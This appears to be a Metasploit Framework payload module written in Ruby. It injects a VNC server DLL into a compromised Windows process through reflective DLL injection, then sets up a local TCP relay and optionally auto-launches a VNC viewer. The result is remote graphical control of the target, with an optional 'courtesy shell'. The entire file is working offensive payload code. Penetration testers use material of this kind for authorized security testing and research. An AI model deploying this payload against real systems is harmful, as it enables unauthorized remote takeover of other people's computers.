# Copyright (c) 2008 Stephen Fewer of Harmony Security (www.harmonysecurity.com)

require 'msf/core'
require 'msf/core/payload/windows/reflectivedllinject'
require 'msf/base/sessions/vncinject'

###
#
# Injects the VNC server DLL (via Reflective Dll Injection) and runs it over the established connection.
#
###
module Metasploit3

	include Msf::Payload::Windows::ReflectiveDllInject
  
	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'VNC Server (Reflective Injection)',
			'Version'       => '$Revision$',
			'Description'   => 'Inject a VNC Dll via a reflective loader',
			'Author'        => [ 'sf' ],
			'Session'       => Msf::Sessions::VncInject ))
      

		# Override the DLL path with the path to the meterpreter server DLL
		register_options(
			[
				OptPort.new('VNCPORT',
					[
						true,
						"The local port to use for the VNC proxy",
						5900
					]),
				OptAddress.new('VNCHOST',
					[
						true,
						"The local host to use for the VNC proxy",
						'127.0.0.1'
					]),
				OptBool.new('AUTOVNC',
					[
						true,
						"Automatically launch VNC viewer if present",
						true
					])
			], self.class)

		register_advanced_options(
			[
				OptBool.new('DisableCourtesyShell',
					[
						false,
						"Disables the Metasploit Courtesy shell",
						false
					])
			], self.class)
		options.remove_option('DLL')
	end

	def library_path
		File.join(Msf::Config.install_root, "data", "vncdll.dll")
	end

	#
	# If the AUTOVNC flag is set to true, automatically try to launch VNC
	# viewer.
	#
	def on_session(session)
		# Calculate the flags to send to the DLL
		flags = 0

		flags |= 1 if (datastore['DisableCourtesyShell'])

		# Transmit the one byte flag
		session.rstream.put([ flags ].pack('C'))

		# Set up the local relay
		print_status("Starting local TCP relay on #{datastore['VNCHOST']}:#{datastore['VNCPORT']}...")

		session.setup_relay(datastore['VNCPORT'], datastore['VNCHOST'])

		print_status("Local TCP relay started.")

		# If the AUTOVNC flag is set, launch VNC viewer.
		if (datastore['AUTOVNC'] == true)
			if (session.autovnc)
				print_status("Launched vnciewer in the background.")
			end
		end
		
		super
	end

end

